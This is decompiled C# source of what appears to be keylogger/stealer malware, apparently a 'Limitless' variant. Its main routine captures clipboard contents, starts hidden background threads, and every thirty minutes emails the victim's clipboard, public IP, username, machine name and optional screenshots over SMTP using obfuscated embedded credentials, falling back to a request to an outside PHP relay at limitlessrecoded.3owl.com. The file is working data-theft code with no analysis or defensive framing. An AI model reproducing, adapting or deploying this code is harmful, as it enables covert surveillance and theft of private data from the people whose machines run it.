using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;
using ns1;
using ns3;

namespace ns2;

internal class Class6
{
	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	public static string string_4;

	public static string string_5;

	public static string string_6;

	public static string string_7;

	public static string string_8;

	public static string string_9;

	public static string string_10;

	public static string string_11;

	public static int int_0 = 0;

	public static string string_12 = null;

	public static string string_13 = Class5.smethod_38("m7SuuKtXc427spakrsC6iKa2wq2TrrCCqYpwsLcj", "False");

	public static string string_14 = Class5.smethod_38("e4SWlJJxhJ6gkH2WmaOPaCM=", "False");

	public static string string_15 = Class5.smethod_38("mq/BxHSOr669slWlvMEj", "False");

	public static int int_1 = 587;

	public static int int_2 = 1800000;

	public static string string_16 = null;

	public static string string_17 = Class5.smethod_38("DLEXSite", "False");

	public static string string_18 = Class5.smethod_38("USERSITE", "False");

	public static string string_19 = "USERTYPE";

	public static string string_20 = Class5.smethod_38("USERTITLE", "False");

	public static string string_21 = Class5.smethod_38("USERBODY", "False");

	public static string string_22 = Class5.smethod_38("USERSKYPEMESSAGE", "False");

	public static string string_23 = null;

	public static string string_24 = null;

	public static Class9 class9_0;

	[STAThread]
	public static void Main()
	{
		try
		{
			string_16 = ((Computer)Class2.smethod_0()).get_Clipboard().GetText();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread.Sleep(int_0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_17();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_33();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread = new Thread((ThreadStart)Class5.smethod_28);
			thread.IsBackground = true;
			thread.Start();
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			class9_0 = new Class9(string_24);
			Class5.smethod_37();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread2 = new Thread(smethod_0);
			thread2.IsBackground = true;
			thread2.Start();
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread3 = new Thread((ThreadStart)Class5.smethod_24);
			thread3.IsBackground = true;
			thread3.Start();
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread4 = new Thread((ThreadStart)Class5.smethod_7);
			thread4.IsBackground = true;
			thread4.Start();
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread5 = new Thread((ThreadStart)Class5.smethod_19);
			thread5.IsBackground = true;
			thread5.Start();
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_5();
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class5.smethod_12();
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread6 = new Thread((ThreadStart)Class5.smethod_1);
			thread6.IsBackground = true;
			thread6.Start();
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread7 = new Thread((ThreadStart)Class5.smethod_35);
			thread7.IsBackground = true;
			thread7.Start();
		}
		catch (Exception projectError17)
		{
			ProjectData.SetProjectError(projectError17);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void smethod_0()
	{
		//IL_01bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c2: Expected O, but got Unknown
		string text = null;
		string text2 = null;
		int num = 0;
		bool flag = false;
		string newLine = Environment.NewLine;
		WebClient webClient = new WebClient();
		while (true)
		{
			Thread.Sleep(int_2);
			try
			{
				text = "[:: Clipboard Logger ::]" + newLine + newLine + string_16 + newLine + newLine;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(100);
			try
			{
				text2 = "[:: IP Logger ::]" + newLine + newLine + webClient.DownloadString(Class5.smethod_38("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + newLine + newLine;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(500);
			try
			{
				if (Operators.CompareString(string_24, (string)null, false) != 0)
				{
					string_23 = string_24 + newLine + newLine + text2 + newLine + text;
					try
					{
						MailMessage mailMessage = new MailMessage();
						MailMessage mailMessage2 = mailMessage;
						mailMessage2.From = new MailAddress(string_13);
						mailMessage2.To.Add(string_13);
						mailMessage2.Subject = Class5.smethod_38("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class5.smethod_38("aQ0=", "False") + Environment.MachineName.ToString();
						mailMessage2.Body = string_23;
						if (flag)
						{
							try
							{
								Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
								Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
								Graphics val2 = Graphics.FromImage((Image)(object)val);
								val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
								Bitmap val3 = val;
								((Image)val3).Save(Path.GetTempPath() + "ss" + num + ".png");
								Attachment item = new Attachment(Path.GetTempPath() + "ss" + num + ".png");
								mailMessage2.Attachments.Add(item);
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
						}
						mailMessage2 = null;
						SmtpClient smtpClient = new SmtpClient(string_15);
						SmtpClient smtpClient2 = smtpClient;
						smtpClient2.Port = int_1;
						smtpClient2.EnableSsl = true;
						smtpClient2.Credentials = new NetworkCredential(string_13, string_14);
						smtpClient2.Send(mailMessage);
						num = checked(num + 1);
						smtpClient2 = null;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						try
						{
							string text3 = "http://limitlessrecoded.3owl.com/RecodedMail.php";
							_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + string_13 + "&subject=" + Strings.Replace(Class5.smethod_38("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class5.smethod_38("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(string_23, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + string_13).GetResponse();
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			string_23 = null;
			string_24 = null;
			string_12 = null;
		}
	}
}
